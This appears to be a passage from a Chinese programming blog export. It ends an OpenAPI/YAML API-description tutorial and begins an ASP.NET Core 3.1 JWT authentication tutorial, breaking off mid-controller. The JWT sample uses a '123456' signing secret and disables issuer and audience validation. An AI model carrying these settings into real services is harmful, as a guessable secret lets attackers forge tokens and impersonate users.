<p>&emsp;&emsp;最重要的还是要时刻牢记，你所设计的这些东西都是用户真正需要的吗？ </p>
<p>&emsp;&emsp;下面切入正题： </p>
<h1 id="使用-API-描述格式来描述-API"><a href="#使用-API-描述格式来描述-API" class="headerlink" title="使用 API 描述格式来描述 API"></a>使用 API 描述格式来描述 API</h1><p>&emsp;&emsp;这里我以 RESTful 风格的 API 为例。想要了解使用 ASP.NET Core 3.x 构建 RESTful API，这里有一个教程：<a href="https://www.bilibili.com/video/av77957694/" target="_blank" rel="noopener">https://www.bilibili.com/video/av77957694/</a> 。</p>
<p>&emsp;&emsp;很多人使用 Excel 或者纸和笔来进行 API 的设计工作。但是如果想要在设计阶段精准描述一个 API，尤其是它的数据，那么最好使用一个结构化的工具，例如 API 描述格式。<br>&emsp;&emsp;API 描述格式会为 API 提供一个标准化的描述，并且它很像代码。它的优势主要有：</p>
<ul>
<li>有助于在项目团队中共享设计 </li>
<li>了解这种格式的人或者工具可以很简单的理解它。 </li>
</ul>
<p>&emsp;&emsp;针对 REST 而言，OpenAPI Specification（OAS）就是一个非常流行的 API 描述格式规范。 </p>
<h2 id="OAS"><a href="#OAS" class="headerlink" title="OAS"></a>OAS</h2><p>&emsp;&emsp;API 描述格式是一种数据格式，它的目标就是描述 API。<br>&emsp;&emsp;而 OAS（OpenAPI Specification）是一个与编程语言无关的 REST API 描述格式。它是由 OAI（OpenAPI Initiative）所提倡的。OAI 是 Linux 基金会下面的一个组织，专注于提供与供应商无关的描述格式。而 OAS 则是社区驱动的一种格式，任何人都可以做贡献。 </p>
<h2 id="OAS-vs-Swagger"><a href="#OAS-vs-Swagger" class="headerlink" title="OAS vs Swagger"></a>OAS vs Swagger</h2><p>&emsp;&emsp;OAS 原来叫 Swagger Specification，2015 年 11 月这个格式被贡献给了 OAI，并在 2016 年 1 月更名为 OpenAPI Specification。Swagger 规范最后的 2.0 版本就变成了 OpenAPI 2.0。目前最新的 OAS 应该是 3.0 大版本 </p>
<h2 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h2><p>&emsp;&emsp;OAS 文档可以使用 YAML 或 JSON 格式，我使用 YAML。 </p>
<h2 id="像写代码一样描述-API"><a href="#像写代码一样描述-API" class="headerlink" title="像写代码一样描述 API"></a>像写代码一样描述 API</h2><p>&emsp;&emsp;OAS 文档就是一个文本文件，可以纳入版本控制系统，例如 Git 等。所以在设计迭代的时候很容易进行版本管理和变化追踪。 </p>
<h2 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h2><p>&emsp;&emsp;OAS 有一个在线的专用编辑器：<a href="http://editor.swagger.io/" target="_blank" rel="noopener">http://editor.swagger.io/</a> 。</p>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;左边是代码编辑区域，右边是渲染结果。 </p>
<p>&emsp;&emsp;但是我更习惯于本地编辑器，我使用 VSCode，并安装 Swagger Viewer 和 openapi-lint 两个插件。 </p>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<h2 id="共享-API-描述，-对-API-进行文档记录"><a href="#共享-API-描述，-对-API-进行文档记录" class="headerlink" title="共享 API 描述， 对 API 进行文档记录"></a>共享 API 描述， 对 API 进行文档记录</h2><p>&emsp;&emsp;OAS 文档可以用来生成 API 对引用文档，这个引用文档可以展示出所有可用的资源以及相应的操作。通常我会使用 Swagger UI，它就是上图右侧的部分。 </p>
<h2 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h2><p>&emsp;&emsp;使用 API 描述格式进行描述的 API，其代码也可以部分生成。通常是一个代码骨架。 </p>
<h2 id="什么时候使用-API-描述格式"><a href="#什么时候使用-API-描述格式" class="headerlink" title="什么时候使用 API 描述格式"></a>什么时候使用 API 描述格式</h2><p>&emsp;&emsp;肯定是在设计接口如何表达 API 目标和概念，以及数据的时候。 </p>
<h1 id="使用-OAS-来描述-REST-API-的资源以及-Action"><a href="#使用-OAS-来描述-REST-API-的资源以及-Action" class="headerlink" title="使用 OAS 来描述 REST API 的资源以及 Action"></a>使用 OAS 来描述 REST API 的资源以及 Action</h1><h2 id="创建-OAS-文档"><a href="#创建-OAS-文档" class="headerlink" title="创建 OAS 文档"></a>创建 OAS 文档</h2><p>&emsp;&emsp;建立一个 products.yaml 文件。<br>&emsp;&emsp;然后在里面输入 api 或 open 等字符串，会出现两个提示选项： </p>
<figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;先选择下面那个选项，其结果是： </p>
<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>第 1 行是 Open API 的版本 </li>
<li>第 4 行<code>info</code>的<code>version</code>是指 API 的版本，而<code>info</code>这个版本必须使用双引号<code>&quot;&quot;</code>括起来，否则 OAS 解析器会把它当成数字，从而导致文档验证失败（因为它的类型应该是字符串）。 </li>
<li>第 5 行<code>paths</code>，<code>paths</code>属性应该包含该 API 可用的资源。这里面使用<code>{}</code>仅仅是为了让文档验证通过，因为我目前还没有写什么内容。在 YAML 里，<code>{}</code>表示一个空的对象，而非空的对象则不需要这对大括号。 </li>
</ul>
<h2 id="描述资源"><a href="#描述资源" class="headerlink" title="描述资源"></a>描述资源</h2><p>&emsp;&emsp;为了描述 products 这个资源，就需要填写<code>paths</code>属性： </p>
<figure class="image-box">
                <img src="5.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里<code>description</code>属性不是强制的，但是它可以用来描述该资源。 </p>
<h2 id="描述资源的操作"><a href="#描述资源的操作" class="headerlink" title="描述资源的操作"></a>描述资源的操作</h2><p>&emsp;&emsp;OAS 文档里描述的资源肯定包含一些操作，否则文档就不合理。<br>&emsp;&emsp;看代码： </p>
<figure class="image-box">
                <img src="6.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;我为<code>/products</code>这个资源添加了一个 GET Action（<code>get</code>属性），然后我对这个<code>get</code>也进行了描述。<br>&emsp;&emsp;<code>summary</code>相当于是对这个 Action 的一个概括性描述，而<code>description</code>则能提供更详细的描述信息。<br>&emsp;&emsp;这里<code>description</code>是支持多行文本的，但是在 YAML 里面要想支持多行文本，那么 <em>string</em> 属性必须以<code>|</code>管道符 开头。<br>&emsp;&emsp;注意，这里第 1 行<code>openapi</code>下面的波浪线表示文档验证失败。   </p>
<p>&emsp;&emsp;在 OAS 文档里，一个操作必须在<code>responses</code>属性里提供至少一个响应： </p>
<figure class="image-box">
                <img src="7.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;一个 Action 可能有多种响应结果，每种可能的响应结果都要在<code>responses</code>属性中描述。<br>&emsp;&emsp;每个响应都以<strong>状态码</strong>进行标识，并且必须包含一个<code>description</code>属性。<br>&emsp;&emsp;注意：状态码数字必须用双引号<code>&quot;&quot;</code>括起来，因为它的类型本应该是字符串，而这里的 200 是一个数字。 </p>
<p>&emsp;&emsp;下面我再添加一个 POST Action： </p>
<figure class="image-box">
                <img src="8.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里还是针对<code>/products</code>这个资源，我就不过多解释了。 </p>
<h1 id="使用-OpenAPI-和-JSON-Schema-来描述-API-的数据"><a href="#使用-OpenAPI-和-JSON-Schema-来描述-API-的数据" class="headerlink" title="使用 OpenAPI 和 JSON Schema 来描述 API 的数据"></a>使用 OpenAPI 和 JSON Schema 来描述 API 的数据</h1><p>&emsp;&emsp;OAS 依赖于 JSON Schema 标准来对所有的数据（查询参数，body 参数，响应 body 等）进行描述。<br>&emsp;&emsp;注意，OAS 使用的其实是 JSON Schema 的一个子集，并不包含所有的 JSON Schema 特性， 并且还添加了一些 OAS 独有的特性到这个子集里。 </p>
<h2 id="描述查询参数"><a href="#描述查询参数" class="headerlink" title="描述查询参数"></a>描述查询参数</h2><p>&emsp;&emsp;如果我们的 get 操作里需要一些查询参数（查询字符串，Query String），那么可以使用<code>parameters</code>这个属性： </p>
<figure class="image-box">
                <img src="9.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里<code>parameters</code>属性是一个集合或数组，每个集合元素使用<code>-</code>开头。 </p>
<p>&emsp;&emsp;为了描述一个参数，至少需要<code>name</code>，<code>in</code>和<code>schema</code>三个属性。在本例中，还包含<code>required</code>和<code>description</code>两个可选的属性。 </p>
<ul>
<li><code>in</code>表示参数的位置，这里值为 <em>query</em> ，表述它是查询字符串（Query String，例如<code>api/products?searchTerm=xxx</code>）。  </li>
<li><code>required</code>为 <em>false</em> 表示不是必填参数。<code>required</code>是可选的，如果没有写的话，那么它的值就是 <em>false</em> 。但是最好还是写上<code>required</code>属性。 </li>
<li>它的数据结构使用<code>schema</code>属性来表示，这里就是一个简单的字符串类型。但是它其实是一个 JSON schema，所以它可以是复杂的对象类型。 </li>
<li><code>description</code>属性也是可选的，但是最好还是写上吧，有个描述更好。 </li>
</ul>
<h2 id="使用-JSON-Schema-来描述数据"><a href="#使用-JSON-Schema-来描述数据" class="headerlink" title="使用 JSON Schema 来描述数据"></a>使用 JSON Schema 来描述数据</h2><p>&emsp;&emsp;假设一个对象有三个属性：编号（ <em>string</em> ），名称（ <em>string</em> ），价格（ <em>number</em> ）。那么使用 JSON Schema 来描述它就应该是这样的： </p>
<figure class="image-box">
                <img src="10.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;还没完，我还必须指出属性是否是必填的，然后我再加上一个 remark 属性，它不是必填的： </p>
<figure class="image-box">
                <img src="11.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;JSON Schema 通过<code>required</code>这个集合属性来表示哪些属性是必填的。 </p>
<p>&emsp;&emsp;此外， 我还可以在这里添加<code>description</code>和<code>example</code>（示例）属性： </p>
<figure class="image-box">
                <img src="12.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;此外 JSON Schema 还支持 对象属性类型： </p>
<figure class="image-box">
                <img src="13.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;JSON Schema 的东西比较多，具体可以查找一下官方文档。 </p>
<h2 id="描述响应"><a href="#描述响应" class="headerlink" title="描述响应"></a>描述响应</h2><p>&emsp;&emsp;在 OAS 文档里，操作响应返回的 body 里的数据是用<code>content</code>属性来表示： </p>
<figure class="image-box">
                <img src="14.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里需要注意的就是该操作的结果是产品的数组，所以类型是 <em>array</em> ， 而 <em>array</em> 的<code>items</code>属性就包含着数组元素的 schema。 </p>
<h2 id="描述-body-参数"><a href="#描述-body-参数" class="headerlink" title="描述 body 参数"></a>描述 body 参数</h2><p>&emsp;&emsp;像 POST 这样的 Action，它的参数是在请求的 body 里面。<br>&emsp;&emsp;body 参数需要使用 requestBody 属性描述，看代码： </p>
<figure class="image-box">
                <img src="15.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这个 body 参数的内容也是使用 JSON Schema 来描述的。 </p>
<h2 id="描述路由参数"><a href="#描述路由参数" class="headerlink" title="描述路由参数"></a>描述路由参数</h2><p>&emsp;&emsp;像<code>api/products/{productId}</code>这样的 URI 里，productId 就是一个路由/路径参数。<br>&emsp;&emsp;它可以这样描述： </p>
<figure class="image-box">
                <img src="16.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里面 name 的值必须和<code>{}</code>里面的值一样。<br>&emsp;&emsp;<code>in</code>的值为 <em>path</em> ，表示是路径参数。<br>&emsp;&emsp;路径参数是必填的，所以<code>required</code>为 <em>true</em> 。不然解析器会报错。 </p>
<h1 id="可复用组件"><a href="#可复用组件" class="headerlink" title="可复用组件"></a>可复用组件</h1><p>&emsp;&emsp;OAS 允许使用可复用的组件，例如 schema，参数，响应等等，使用它们的时候添加个引用就行。 </p>
<p>&emsp;&emsp;假设针对<code>/products</code>这个资源一共有两个操作：一个是返回一组产品，另一个返回单个产品。这时候返回产品的 JSON Schema 就可以使用一个可复用的 schema。<br>&emsp;&emsp;可复用的组件要放在<code>components</code>区域，它是 OAS 文档的一个根级属性。看例子： </p>
<figure class="image-box">
                <img src="17.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里面，可复用的 schema 被定义在<code>schemas</code>属性里，每个可重用的 schema 的名字就是<code>schemas</code>的值，这里就是 product。它下就包含着可重用的组件：一个 JSON Schema。 </p>
<h2 id="引用定义好的-schema"><a href="#引用定义好的-schema" class="headerlink" title="引用定义好的 schema"></a>引用定义好的 schema</h2><p>&emsp;&emsp;引用定义好的 schema 需要使用到 JSON 引用。JSON 引用这个属性的名字是<code>$ref</code>，它的值是一个 URL。这个 URL 可指向本文档内部甚至外部的组件。这里我只引用文档内部的组件。 </p>
<figure class="image-box">
                <img src="18.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;而针对那个 get Action 的返回结果（数组类型），需要把 JSON 引用放在 <em>array</em> 的<code>items</code>属性里。 </p>
<h2 id="可复用参数"><a href="#可复用参数" class="headerlink" title="可复用参数"></a>可复用参数</h2><p>&emsp;&emsp;直接看代码： </p>
<figure class="image-box">
                <img src="19.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;和可复用 schema 类似，可复用参数也放在<code>components</code>下面，它所在的区域是<code>parameters</code>。其引用方式也类似，就不过多介绍了。 </p>
<p>&emsp;&emsp;除了在 Action 级别引用可复用参数，在资源这个级别也可以这样做： </p>
<figure class="image-box">
                <img src="20.png" alt title class>
                <p></p>
            </figure>

<h1 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h1><figure class="image-box">
                <img src="21.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="22.png" alt title class>
                <p></p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ASP.Net Core 3.1 中使用 JWT 认证]]></title>
      <url>/2020/01/20/UseJwtInAspNetCore/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/liuww/p/12177272.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuww/p/12177272.html</a></p>
</blockquote>
<a id="more"></a>

<h1 id="JWT-认证简单介绍"><a href="#JWT-认证简单介绍" class="headerlink" title="JWT 认证简单介绍"></a>JWT 认证简单介绍</h1><p>&emsp;&emsp;关于 JWT 的介绍网上很多，此处不再赘述，我们主要看看 JWT 的结构。<br>&emsp;&emsp;JWT 主要由三部分组成，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEADER.PAYLOAD.SIGNATURE</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;<code>HEADER</code>：包含 token 的元数据，主要是加密算法，和签名的类型。<br>&emsp;&emsp;如下面的信息，说明了加密的对象类型是 JWT，加密算法是 HMAC SHA-256。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"alg"</span>:<span class="string">"HS256"</span>,<span class="attr">"typ"</span>:<span class="string">"JWT"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后需要通过 <strong>BASE64</strong> 编码后存入 token 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;<code>Payload</code>：主要包含一些声明信息（claim），这些声明是 <strong>key-value 对</strong> 的数据结构。<br>&emsp;&emsp;通常如用户名，角色等信息，过期日期等，因为是未加密的，所以不建议存放敏感信息。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"</span>:<span class="string">"admin"</span>,<span class="attr">"exp"</span>:<span class="number">1578645536</span>,<span class="attr">"iss"</span>:<span class="string">"webapi.cn"</span>,<span class="attr">"aud"</span>:<span class="string">"WebApi"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;也需要通过 <strong>BASE64</strong> 编码后存入 token 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJleHAiOjE1Nzg2NDU1MzYsImlzcyI6IndlYmFwaS5jbiIsImF1ZCI6IldlYkFwaSJ9</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;<code>Signature</code>：JWT 要符合 JWS（Json Web Signature）的标准生成一个最终的签名。把编码后的 Header 和 Payload 信息加在一起，然后使用一个强加密算法，如 Hmac SHA-256，进行加密。<code>HS256(BASE64(Header).Base64(Payload)，secret)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2_akEH40LR2QWekgjm8Tt3lesSbKtDethmJMo_3jpF4</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;最后生成的token如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.</span><br><span class="line">eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJleHAiOjE1Nzg2NDU1MzYsImlzcyI6IndlYmFwaS5jbiIsImF1ZCI6IldlYkFwaSJ9.</span><br><span class="line">2_akEH40LR2QWekgjm8Tt3lesSbKtDethmJMo_3jpF4</span><br></pre></td></tr></table></figure>

<h1 id="ASP-NET-Core-3-1-Web-API-中使用-JWT-认证"><a href="#ASP-NET-Core-3-1-Web-API-中使用-JWT-认证" class="headerlink" title="ASP.NET Core 3.1 Web API 中使用 JWT 认证"></a>ASP.NET Core 3.1 Web API 中使用 JWT 认证</h1><blockquote>
<p>开发环境：  </p>
<ul>
<li>框架：ASP.NET Core 3.1  </li>
<li>IDE：Visual Studio 2019</li>
</ul>
</blockquote>
<p>&emsp;&emsp;命令行中执行执行以下命令，创建 Web API 项目：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet new webapi -n Webapi -o WebApi</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;特别注意的是，3.x 默认是没有 JWT 的<code>Microsoft.AspNetCore.Authentication.JwtBearer</code>库的，所以需要手动添加 NuGet Package，切换到项目所在目录，执行 .NET CLI 命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet add package Microsoft.AspNetCore.Authentication.JwtBearer --version 3.1.0</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;创建一个简单的 POCO 类，用来存储签发或者验证 JWT 时用到的信息：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Webapi.Models</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TokenManagement</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">JsonProperty(<span class="meta-string">"secret"</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> Secret &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">JsonProperty(<span class="meta-string">"issuer"</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> Issuer &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">JsonProperty(<span class="meta-string">"audience"</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> Audience &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">JsonProperty(<span class="meta-string">"accessExpiration"</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> AccessExpiration &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">JsonProperty(<span class="meta-string">"refreshExpiration"</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> RefreshExpiration &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在<code>appsettings.Development.json</code>添加 JWT 使用到的配置信息（如果是生成环境在<code>appsettings.json</code>添加即可）：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">"tokenManagement": &#123;</span><br><span class="line">    "secret": "123456",</span><br><span class="line">    "issuer": "webapi.cn",</span><br><span class="line">    "audience": "WebApi",</span><br><span class="line">    "accessExpiration": 30,</span><br><span class="line">    "refreshExpiration": 60</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在<code>StartUp</code>类的<code>ConfigureServices</code>方法中添加读取配置信息：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddControllers();</span><br><span class="line">    services.Configure&lt;TokenManagement&gt;(Configuration.GetSection(<span class="string">"tokenManagement"</span>));</span><br><span class="line">    <span class="keyword">var</span> token = Configuration.GetSection(<span class="string">"tokenManagement"</span>).Get&lt;TokenManagement&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;到目前为止，我们完成了一些基础工作，下面在 Web API 中注入 JWT 的验证服务，并在中间件管道中启用 Authentication 中间件。<br>&emsp;&emsp;<code>StartUp</code>类中要引用 JWT 验证服务的命名空间：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Authentication.JwtBearer;</span><br><span class="line"><span class="keyword">using</span> Microsoft.IdentityModel.Tokens;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在<code>ConfigureServices</code>方法中添加如下逻辑：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">services.AddAuthentication(x =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;</span><br><span class="line">    x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;</span><br><span class="line">&#125;).AddJwtBearer(x =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    x.RequireHttpsMetadata = <span class="literal">false</span>;</span><br><span class="line">    x.SaveToken = <span class="literal">true</span>;</span><br><span class="line">    x.TokenValidationParameters = <span class="keyword">new</span> TokenValidationParameters</span><br><span class="line">    &#123;</span><br><span class="line">        ValidateIssuerSigningKey = <span class="literal">true</span>,</span><br><span class="line">        IssuerSigningKey = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.ASCII.GetBytes(token.Secret)),</span><br><span class="line">        ValidIssuer = token.Issuer,</span><br><span class="line">        ValidAudience = token.Audience,</span><br><span class="line">        ValidateIssuer = <span class="literal">false</span>,</span><br><span class="line">        ValidateAudience = <span class="literal">false</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在<code>Configure</code>方法中启用验证：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (env.IsDevelopment())</span><br><span class="line">    &#123;</span><br><span class="line">        app.UseDeveloperExceptionPage();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    app.UseHttpsRedirection();</span><br><span class="line"></span><br><span class="line">    app.UseAuthentication();</span><br><span class="line">    app.UseRouting();</span><br><span class="line"></span><br><span class="line">    app.UseAuthorization();</span><br><span class="line"></span><br><span class="line">    app.UseEndpoints(endpoints =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        endpoints.MapControllers();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>&emsp;&emsp;上面完成了 JWT 验证的功能，下面就需要添加签发 token 的逻辑。我们需要添加一个专门用来用户认证和签发 token 的控制器，命名成 AuthenticationController，同时添加一个请求的 DTO 类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LoginRequestDTO</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Required</span>]</span><br><span class="line">    [<span class="meta">JsonProperty(<span class="meta-string">"username"</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Username &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Required</span>]</span><br><span class="line">    [<span class="meta">JsonProperty(<span class="meta-string">"password"</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Password &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Route(<span class="meta-string">"api/[controller]"</span>)</span>]</span><br><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AuthenticationController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">AllowAnonymous</span>]</span><br><span class="line">    [<span class="meta">HttpPost, Route(<span class="meta-string">"requestToken"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ActionResult <span class="title">RequestToken</span>(<span class="params">[FromBody] LoginRequestDTO request</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ModelState.IsValid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> BadRequest(<span class="string">"Invalid 